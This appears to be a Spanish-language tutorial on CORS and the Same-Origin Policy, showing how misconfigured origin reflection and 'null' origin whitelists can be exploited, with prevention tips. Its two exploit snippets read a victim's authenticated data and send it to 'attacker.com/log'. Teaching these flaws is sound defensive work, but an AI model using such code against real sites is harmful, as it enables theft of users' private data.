# Cross-Origin Resource Sharing

## 📂 Introducción

CORS (Cross-Origin Resource Sharing) es un mecanismo implementado por los navegadores modernos que permite el acceso controlado a recursos ubicados en un dominio distinto al de la página que realiza la solicitud. Esta guía, basada en el contenido de [PortSwigger Research](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties), explica qué es CORS, cómo funciona, ejemplos de configuraciones vulnerables y cómo prevenir ataques relacionados.

## ❓ ¿Qué es CORS?

CORS es un protocolo basado en cabeceras HTTP que permite a un servidor indicar qué orígenes (dominios) externos pueden acceder a sus recursos. Su propósito es **relajar la Same-Origin Policy (SOP)**, una política de seguridad que impide que un sitio web lea contenido de otro sitio diferente.

> ⚠ Importante: CORS **no es una defensa contra ataques cross-origin como CSRF**.

## 🔐 Same-Origin Policy (SOP)

La SOP impide que scripts cargados desde un origen accedan a datos de otro origen diferente (diferente dominio, puerto o protocolo). Esta restricción protege la privacidad del usuario al evitar fugas de información entre sitios.

### Ejemplo:

Un script cargado desde `https://ejemplo.com` **no podrá acceder** al contenido de `https://api.ejemplo.com` sin una política CORS adecuada.

## ⚖️ Flexibilización controlada mediante CORS

CORS permite que el servidor indique explícitamente qué orígenes están autorizados para acceder a sus recursos, usando cabeceras como:

* `Access-Control-Allow-Origin`
* `Access-Control-Allow-Credentials`
* `Access-Control-Allow-Methods`
* `Access-Control-Allow-Headers`

El navegador realiza una "negociación" previa (preflight) cuando se trata de solicitudes complejas, utilizando el método `OPTIONS` para consultar las reglas del servidor.

## ⚡ Ejemplo de ataque por mala configuración de CORS

### Caso: servidor refleja el header `Origin`

**Solicitud maliciosa:**

```http
GET /sensitive-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://attacker.com
Cookie: sessionid=...
```

**Respuesta del servidor vulnerable:**

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```

**Exploit en JavaScript:**

```javascript
var req = new XMLHttpRequest();
req.onload = function() {
    location = 'https://attacker.com/log?data=' + this.responseText;
};
req.open('GET', 'https://vulnerable-website.com/sensitive-data', true);
req.withCredentials = true;
req.send();
```

Este código permite al atacante **leer información sensible** desde el navegador de la víctima autenticada.

## 🚨 Otras configuraciones inseguras

### 🔒 1. Errores en el parseo de dominios

* Whitelist mal implementada: permitir cualquier dominio que termine en `example.com` puede permitir `attackerexample.com`
* O permitir cualquier dominio que comience con `example.com` permite `example.com.attacker.com`

### 🔒 2. Whitelist que acepta `null` como origen

Navegadores pueden enviar `Origin: null` en ciertos escenarios:

* `file://` URLs
* iframes con sandbox
* Redirecciones entre sitios

**Respuesta vulnerable:**

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**Exploit con iframe sandbox:**

```html
<iframe sandbox="allow-scripts allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = function() {
  location = 'https://attacker.com/log?data=' + this.responseText;
};
req.open('GET', 'https://vulnerable.com/data', true);
req.withCredentials = true;
req.send();
</script>"></iframe>
```

## ᾑ6 Consejos para prevenir ataques CORS

* **Nunca reflejar el ********`Origin`******** directamente** en `Access-Control-Allow-Origin`.
* Usar una **whitelist validada con exactitud** (sin regex permisivos).
* \*\*Nunca permitir \*\***`Access-Control-Allow-Credentials: true`** junto con `*` como origen.
* Bloquear `Origin: null` salvo que sea explícitamente necesario.
* Monitorear las cabeceras de respuesta y realizar auditorías regulares.

## 🔗 Enlaces de interés

* [CORS official MDN documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
* [Same-Origin Policy explicada](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
* [CORS vulnerability research by PortSwigger](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [CORS misconfig checker](https://github.com/s0md3v/Corsy)

---

